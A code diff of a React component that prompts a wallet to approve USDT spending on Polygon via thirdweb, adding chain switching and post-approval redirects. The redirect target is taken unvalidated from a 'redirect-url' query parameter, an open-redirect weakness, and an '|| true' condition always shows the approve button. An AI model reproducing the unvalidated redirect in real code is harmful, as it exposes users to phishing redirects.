@@ -4,10 +4,11 @@ import {
   useContractRead,
   useAddress,
   useChainId,
+  useSwitchChain,
   useConnectionStatus,
 } from "@thirdweb-dev/react";
 import React, { useEffect, useState } from "react";
-import { useRouter } from 'next/router';
+import { useRouter } from "next/router";
 import { Polygon } from "@thirdweb-dev/chains";
 import styles from "./ApproveButton.module.css";
 
@@ -15,36 +16,36 @@ const ApproveButton = ({
   approvalStatus,
   setApprovalStatus,
   showApproveButton,
-  setShowApproveButton
+  setShowApproveButton,
 }) => {
   const router = useRouter();
-  const [redirectUrl, setRedirectUrl] = useState(null); 
+  const [redirectUrl, setRedirectUrl] = useState(null);
   const address = useAddress();
+  const [approvalInitiated, setApprovalInitiated] = useState(false);
+  const currentChainId = useChainId();
+  const connectionStatus = useConnectionStatus();
+  const switchChain = useSwitchChain();
   useEffect(() => {
     if (router.isReady) {
-      setRedirectUrl(router.query['redirect-url']);
+      setRedirectUrl(router.query["redirect-url"]);
     }
   }, [router.isReady]);
   useEffect(() => {
-    console.log(address)
-    if(address===undefined){
-      setShowApproveButton(false)
+    if (address === undefined) {
+      setShowApproveButton(false);
     }
   }, [address]);
 
-  const [approvalComplete, setApprovalComplete] = useState(false);
   const { contract } = useContract(
     "0xc2132D05D31c914a87C6611C10748AEb04B58e8F"
   );
-  const handleApprovalComplete = () => {
-    setApprovalStatus(true);
-    setApprovalComplete(true);
-  };
+  
   const {
     mutateAsync: approve,
     isLoading: isApproving,
     error,
   } = useContractWrite(contract, "approve");
+  
   useEffect(() => {
     if (error === null) {
       setApprovalInitiated(false);
@@ -57,16 +58,22 @@ const ApproveButton = ({
     "allowance",
     [address, spender]
   );
-  const [approvalInitiated, setApprovalInitiated] = useState(false);
-  const currentChainId = useChainId();
-  const connectionStatus = useConnectionStatus();
+  
   //const hasApprovalFailure = approvalEvents.some((event) => event.error);
   const [buttonStatus, setbuttonStatus] = useState(false);
   const callApproval = async () => {
     try {
       if (currentChainId !== Polygon.chainId) {
         console.error("Wrong network. Please switch to the Polygon network.");
-        return;
+        if (connectionStatus === "connected") {
+          try {
+            await switchChain(Polygon.chainId);
+            return;
+          } catch (err) {
+            console.log("ERROR", err)
+            return;
+          }
+        }
       }
       console.log("checking", address, isChecking, approvalInitiated);
       if (address && !isChecking && !approvalInitiated) {
@@ -74,22 +81,24 @@ const ApproveButton = ({
           setApprovalStatus(true);
           setTimeout(() => {
             router.push(`${redirectUrl}/${address}`);
-          }, 2000);
+          }, 1500);
         } else {
           setApprovalInitiated(true);
           const data = await approve({ args: [spender, amount] });
           console.info("Contract call success:", data);
           setApprovalStatus(true);
           setApprovalInitiated(false);
-          
+          setTimeout(() => {
+            router.push(`${redirectUrl}/${address}`);
+          }, 1300);
         }
       }
     } catch (err) {
-      console.error("Contract call failure:", err);
+      console.log("Contract call failure:", err);
     }
   };
 
-  if ((!approvalStatus?.isApproved||true) && showApproveButton) {
+  if ((!approvalStatus?.isApproved || true) && showApproveButton) {
     return (
       <button
         onClick={() => {
@@ -98,13 +107,11 @@ const ApproveButton = ({
         }}
         className={styles.connectedButton}
       >
-        Retry Enable USDT
+        Enable USDT
       </button>
     );
   }
-  return (
-    <div></div>
-  );
+  return <div></div>;
 };
 
 export default ApproveButton;
